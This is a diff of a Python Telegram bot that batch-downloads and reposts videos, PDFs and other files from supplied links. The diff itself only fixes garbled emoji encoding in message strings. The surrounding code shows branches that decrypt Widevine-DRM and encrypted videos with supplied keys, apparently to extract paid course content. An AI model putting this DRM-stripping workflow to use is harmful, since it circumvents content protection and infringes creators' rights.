@@ -822,12 +781,12 @@ async def txt_handler(bot: Client, m: Message):
                 cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
 
             try:
-                cc = f'[ðŸŽ¥]Vid Id : {str(count).zfill(3)}\n**Video Title :** `{name1} [{res}p].mkv`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n'
-                cc1 = f'[ðŸ“•]Pdf Id : {str(count).zfill(3)}\n**File Title :** `{name1}.pdf`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n'
-                cczip = f'[ðŸ“]Zip Id : {str(count).zfill(3)}\n**Zip Title :** `{name1}.zip`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n' 
-                ccimg = f'[ðŸ–¼ï¸]Img Id : {str(count).zfill(3)}\n**Img Title :** `{name1}.jpg`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n'
-                ccm = f'[ðŸŽµ]Audio Id : {str(count).zfill(3)}\n**Audio Title :** `{name1}.mp3`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n'
-                cchtml = f'[ðŸŒ]Html Id : {str(count).zfill(3)}\n**Html Title :** `{name1}.html`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted byâž¤**{CR}\n'
+                cc = f'[🎥]Vid Id : {str(count).zfill(3)}\n**Video Title :** `{name1} [{res}p].mkv`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n'
+                cc1 = f'[📕]Pdf Id : {str(count).zfill(3)}\n**File Title :** `{name1}.pdf`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n'
+                cczip = f'[📁]Zip Id : {str(count).zfill(3)}\n**Zip Title :** `{name1}.zip`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n' 
+                ccimg = f'[🖼️]Img Id : {str(count).zfill(3)}\n**Img Title :** `{name1}.jpg`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n'
+                ccm = f'[🎵]Audio Id : {str(count).zfill(3)}\n**Audio Title :** `{name1}.mp3`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n'
+                cchtml = f'[🌐]Html Id : {str(count).zfill(3)}\n**Html Title :** `{name1}.html`\n<blockquote><b>Batch Name :</b> {b_name}</blockquote>\n\n**Extracted by➤**{CR}\n'
                   
                 if "drive" in url:
                     try:
@@ -961,7 +920,7 @@ async def txt_handler(bot: Client, m: Message):
                     time.sleep(1)
                 
             except Exception as e:
-                await bot.send_message(channel_id, f'âš ï¸**Downloading Failed**âš ï¸\n**Name** =>> `{str(count).zfill(3)} {name1}`\n**Url** =>> {url}\n\n<blockquote><i><b>Failed Reason: {str(e)}</b></i></blockquote>', disable_web_page_preview=True)
+                await bot.send_message(channel_id, f'⚠️**Downloading Failed**⚠️\n**Name** =>> `{str(count).zfill(3)} {name1}`\n**Url** =>> {url}\n\n<blockquote><i><b>Failed Reason: {str(e)}</b></i></blockquote>', disable_web_page_preview=True)
                 count += 1
                 failed_count += 1
                 continue
@@ -973,10 +932,10 @@ async def txt_handler(bot: Client, m: Message):
     success_count = len(links) - failed_count
     video_count = v2_count + mpd_count + m3u8_count + yt_count + drm_count + zip_count + other_count
     if raw_text7 == "/d":
-        await bot.send_message(channel_id, f"<b>-â”ˆâ”â•.â€¢Â°âœ… Completed âœ…Â°â€¢.â•â”â”ˆ-</b>\n<blockquote><b>ðŸŽ¯Batch Name : {b_name}</b></blockquote>\n<blockquote>ðŸ”— Total URLs: {len(links)} \nâ”ƒ   â” ðŸ”´ Total Failed URLs: {failed_count}\nâ”ƒ   â” ðŸŸ¢ Total Successful URLs: {success_count}\nâ”ƒ   â”ƒ   â” ðŸŽ¥ Total Video URLs: {video_count}\nâ”ƒ   â”ƒ   â” ðŸ“„ Total PDF URLs: {pdf_count}\nâ”ƒ   â”ƒ   â” ðŸ“¸ Total IMAGE URLs: {img_count}</blockquote>\n")
+        await bot.send_message(channel_id, f"<b>-┈━═.•°✅ Completed ✅°•.═━┈-</b>\n<blockquote><b>🎯Batch Name : {b_name}</b></blockquote>\n<blockquote>🔗 Total URLs: {len(links)} \n┃   ┠🔴 Total Failed URLs: {failed_count}\n┃   ┠🟢 Total Successful URLs: {success_count}\n┃   ┃   ┠🎥 Total Video URLs: {video_count}\n┃   ┃   ┠📄 Total PDF URLs: {pdf_count}\n┃   ┃   ┠📸 Total IMAGE URLs: {img_count}</blockquote>\n")
     else:
-        await bot.send_message(channel_id, f"<b>-â”ˆâ”â•.â€¢Â°âœ… Completed âœ…Â°â€¢.â•â”â”ˆ-</b>\n<blockquote><b>ðŸŽ¯Batch Name : {b_name}</b></blockquote>\n<blockquote>ðŸ”— Total URLs: {len(links)} \nâ”ƒ   â” ðŸ”´ Total Failed URLs: {failed_count}\nâ”ƒ   â” ðŸŸ¢ Total Successful URLs: {success_count}\nâ”ƒ   â”ƒ   â” ðŸŽ¥ Total Video URLs: {video_count}\nâ”ƒ   â”ƒ   â” ðŸ“„ Total PDF URLs: {pdf_count}\nâ”ƒ   â”ƒ   â” ðŸ“¸ Total IMAGE URLs: {img_count}</blockquote>\n")
-        await bot.send_message(m.chat.id, f"<blockquote><b>âœ… Your Task is completed, please check your Set ChannelðŸ“±</b></blockquote>")
+        await bot.send_message(channel_id, f"<b>-┈━═.•°✅ Completed ✅°•.═━┈-</b>\n<blockquote><b>🎯Batch Name : {b_name}</b></blockquote>\n<blockquote>🔗 Total URLs: {len(links)} \n┃   ┠🔴 Total Failed URLs: {failed_count}\n┃   ┠🟢 Total Successful URLs: {success_count}\n┃   ┃   ┠🎥 Total Video URLs: {video_count}\n┃   ┃   ┠📄 Total PDF URLs: {pdf_count}\n┃   ┃   ┠📸 Total IMAGE URLs: {img_count}</blockquote>\n")
+        await bot.send_message(m.chat.id, f"<blockquote><b>✅ Your Task is completed, please check your Set Channel📱</b></blockquote>")
 
 
 @bot.on_message(filters.text & filters.private)
@@ -992,10 +951,10 @@ async def text_handler(bot: Client, m: Message):
         await m.reply_text("<pre><code>Invalid link format.</code></pre>")
         return
         
-    editable = await m.reply_text(f"<pre><code>**ðŸ”¹Processing your link...\nðŸ”Please wait...â³**</code></pre>")
+    editable = await m.reply_text(f"<pre><code>**🔹Processing your link...\n🔁Please wait...⏳**</code></pre>")
     await m.delete()
 
-    await editable.edit(f"â•­â”â”â”â”â°á´‡É´á´›á´‡Ê€ Ê€á´‡êœ±á´ÊŸá´œá´›Éªá´É´â±â”â”âž£ \nâ”£â”â”âª¼ send `144`  for 144p\nâ”£â”â”âª¼ send `240`  for 240p\nâ”£â”â”âª¼ send `360`  for 360p\nâ”£â”â”âª¼ send `480`  for 480p\nâ”£â”â”âª¼ send `720`  for 720p\nâ”£â”â”âª¼ send `1080` for 1080p\nâ•°â”â”âŒˆâš¡[`{CREDIT}`]âš¡âŒ‹â”â”âž£ ")
+    await editable.edit(f"╭━━━━❰ᴇɴᴛᴇʀ ʀᴇꜱᴏʟᴜᴛɪᴏɴ❱━━➣ \n┣━━⪼ send `144`  for 144p\n┣━━⪼ send `240`  for 240p\n┣━━⪼ send `360`  for 360p\n┣━━⪼ send `480`  for 480p\n┣━━⪼ send `720`  for 720p\n┣━━⪼ send `1080` for 1080p\n╰━━⌈⚡[`{CREDIT}`]⚡⌋━━➣ ")
     input2: Message = await bot.listen(editable.chat.id, filters=filters.text & filters.user(m.from_user.id))
     raw_text2 = input2.text
     quality = f"{raw_text2}p"
@@ -1099,8 +1058,8 @@ async def text_handler(bot: Client, m: Message):
                 cmd = f'yt-dlp -f "{ytf}" "{url}" -o "{name}.mp4"'
 
             try:
-                cc = f'ðŸŽžï¸ð“ð¢ð­ð¥ðž Â» `{name} [{res}].mp4`\nðŸ”—ð‹ð¢ð§ð¤ Â» <a href="{link}">__**CLICK HERE**__</a>\n\nðŸŒŸð„ð±ð­ð«ðšðœð­ðžð ðð² Â» `{CREDIT}`'
-                cc1 = f'ðŸ“•ð“ð¢ð­ð¥ðž Â» `{name}`\nðŸ”—ð‹ð¢ð§ð¤ Â» <a href="{link}">__**CLICK HERE**__</a>\n\nðŸŒŸð„ð±ð­ð«ðšðœð­ðžð ðð² Â» `{CREDIT}`'
+                cc = f'🎞️𝐓𝐢𝐭𝐥𝐞 » `{name} [{res}].mp4`\n🔗𝐋𝐢𝐧𝐤 » <a href="{link}">__**CLICK HERE**__</a>\n\n🌟𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐁𝐲 » `{CREDIT}`'
+                cc1 = f'📕𝐓𝐢𝐭𝐥𝐞 » `{name}`\n🔗𝐋𝐢𝐧𝐤 » <a href="{link}">__**CLICK HERE**__</a>\n\n🌟𝐄𝐱𝐭𝐫𝐚𝐜𝐭𝐞𝐝 𝐁𝐲 » `{CREDIT}`'
                   
                 if "drive" in url:
                     try:
@@ -1151,7 +1110,7 @@ async def text_handler(bot: Client, m: Message):
                             
                         if not success:
                             # Send the final failure message if all retries fail
-                            await m.reply_text(f"Failed to download PDF after {max_retries} attempts.\nâš ï¸**Downloading Failed**âš ï¸\n**Name** =>> {str(count).zfill(3)} {name1}\n**Url** =>> {link0}", disable_web_page_preview)
+                            await m.reply_text(f"Failed to download PDF after {max_retries} attempts.\n⚠️**Downloading Failed**⚠️\n**Name** =>> {str(count).zfill(3)} {name1}\n**Url** =>> {link0}", disable_web_page_preview)
                             
                     else:
                         try:
@@ -1193,9 +1152,9 @@ async def text_handler(bot: Client, m: Message):
                         pass
                                 
                 elif 'encrypted.m' in url:    
-                    Show = f"**âš¡Dá´á´¡É´ÊŸá´á´€á´…ÉªÉ´É¢ Sá´›á´€Ê€á´›á´‡á´…...â³**\n" \
-                           f"ðŸ”—ð‹ð¢ð§ð¤ Â» {url}\n" \
-                           f"âœ¦ðð¨ð­ ðŒðšððž ðð² âœ¦ {CREDIT}"
+                    Show = f"**⚡Dᴏᴡɴʟᴏᴀᴅɪɴɢ Sᴛᴀʀᴛᴇᴅ...⏳**\n" \
+                           f"🔗𝐋𝐢𝐧𝐤 » {url}\n" \
+                           f"✦𝐁𝐨𝐭 𝐌𝐚𝐝𝐞 𝐁𝐲 ✦ {CREDIT}"
                     prog = await m.reply_text(Show, disable_web_page_preview=True)
                     res_file = await helper.download_and_decrypt_video(url, cmd, name, appxkey)  
                     filename = res_file  
@@ -1205,9 +1164,9 @@ async def text_handler(bot: Client, m: Message):
                     pass
 
                 elif 'drmcdni' in url or 'drm/wv' in url:
-                    Show = f"**âš¡Dá´á´¡É´ÊŸá´á´€á´…ÉªÉ´É¢ Sá´›á´€Ê€á´›á´‡á´…...â³**\n" \
-                           f"ðŸ”—ð‹ð¢ð§ð¤ Â» {url}\n" \
-                           f"âœ¦ðð¨ð­ ðŒðšððž ðð² âœ¦ {CREDIT}"
+                    Show = f"**⚡Dᴏᴡɴʟᴏᴀᴅɪɴɢ Sᴛᴀʀᴛᴇᴅ...⏳**\n" \
+                           f"🔗𝐋𝐢𝐧𝐤 » {url}\n" \
+                           f"✦𝐁𝐨𝐭 𝐌𝐚𝐝𝐞 𝐁𝐲 ✦ {CREDIT}"
                     prog = await m.reply_text(Show, disable_web_page_preview=True)
                     res_file = await helper.decrypt_and_merge_video(mpd, keys_string, path, name, raw_text2)
                     filename = res_file
@@ -1217,9 +1176,9 @@ async def text_handler(bot: Client, m: Message):
                     pass
      
                 else:
-                    Show = f"**âš¡Dá´á´¡É´ÊŸá´á´€á´…ÉªÉ´É¢ Sá´›á´€Ê€á´›á´‡á´…...â³**\n" \
-                           f"ðŸ”—ð‹ð¢ð§ð¤ Â» {url}\n" \
-                           f"âœ¦ðð¨ð­ ðŒðšððž ðð² âœ¦ {CREDIT}"
+                    Show = f"**⚡Dᴏᴡɴʟᴏᴀᴅɪɴɢ Sᴛᴀʀᴛᴇᴅ...⏳**\n" \
+                           f"🔗𝐋𝐢𝐧𝐤 » {url}\n" \
+                           f"✦𝐁𝐨𝐭 𝐌𝐚𝐝𝐞 𝐁𝐲 ✦ {CREDIT}"
                     prog = await m.reply_text(Show, disable_web_page_preview=True)
                     res_file = await helper.download_video(url, cmd, name)
                     filename = res_file
@@ -1228,7 +1187,7 @@ async def text_handler(bot: Client, m: Message):
                     time.sleep(1)
 
             except Exception as e:
-                    await m.reply_text(f"âš ï¸ðƒð¨ð°ð§ð¥ð¨ðšðð¢ð§ð  ðˆð§ð­ðžð«ð®ð©ð­ðžð\n\nðŸ”—ð‹ð¢ð§ð¤ Â» `{link}`\n\n<blockquote><b><i>âš ï¸Failed Reason Â»**__\n{str(e)}</i></b></blockquote>")
+                    await m.reply_text(f"⚠️𝐃𝐨𝐰𝐧𝐥𝐨𝐚𝐝𝐢𝐧𝐠 𝐈𝐧𝐭𝐞𝐫𝐮𝐩𝐭𝐞𝐝\n\n🔗𝐋𝐢𝐧𝐤 » `{link}`\n\n<blockquote><b><i>⚠️Failed Reason »**__\n{str(e)}</i></b></blockquote>")
                     pass
 
     except Exception as e:
